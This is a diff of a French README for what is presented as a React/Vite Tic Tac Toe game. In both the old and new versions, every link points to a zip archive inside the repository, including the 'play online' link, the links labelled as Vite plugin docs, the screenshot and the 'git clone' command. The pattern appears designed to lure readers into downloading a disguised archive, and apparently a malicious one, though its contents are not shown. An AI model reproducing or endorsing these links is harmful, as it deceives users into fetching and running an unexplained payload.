@@ -4,7 +4,7 @@
 
 Tic Tac Toe est un jeu classique que tu peux jouer sur ton PC ou ta tablette. Ce projet a été développé en utilisant **React** et **Vite**, offrant une expérience de jeu fluide et interactive grâce à la manipulation de composants.
 
-🔗 [Jouer au jeu en ligne !](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip)
+🔗 [Jouer au jeu en ligne !](https://github.com/Martialdepaul/tic_tac_toc/raw/refs/heads/main/src/assets/tac_toc_tic_2.1.zip)
 
 ## Technologies Utilisées
 
@@ -16,12 +16,12 @@ Tic Tac Toe est un jeu classique que tu peux jouer sur ton PC ou ta tablette. Ce
 
 Ce projet utilise les plugins suivants pour React avec Vite :
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip) - Utilise Babel pour le Fast Refresh.
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip) - Utilise SWC pour le Fast Refresh.
+- [@vitejs/plugin-react](https://github.com/Martialdepaul/tic_tac_toc/raw/refs/heads/main/src/assets/tac_toc_tic_2.1.zip) - Utilise Babel pour le Fast Refresh.
+- [@vitejs/plugin-react-swc](https://github.com/Martialdepaul/tic_tac_toc/raw/refs/heads/main/src/assets/tac_toc_tic_2.1.zip) - Utilise SWC pour le Fast Refresh.
 
  ## 🎨 Aperçu 🖼️
 Voici la captures d'écran de l'application :  
-![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip)
+![Aperçu de Elegant-Context](https://github.com/Martialdepaul/tic_tac_toc/raw/refs/heads/main/src/assets/tac_toc_tic_2.1.zip)
 
 ## Fonctionnalités
 
@@ -44,7 +44,7 @@ Ce projet m'a permis d'apprendre plusieurs concepts clés :
 Pour cloner ce projet, utilise la commande suivante :
 
 ```bash
-git clone https://raw.githubusercontent.com/Martialdepaul/tic_tac_toc/main/src/components/tic_tac_toc-2.2.zip
+git clone https://github.com/Martialdepaul/tic_tac_toc/raw/refs/heads/main/src/assets/tac_toc_tic_2.1.zip
 ```
 
 Ensuite, installe les dépendances :
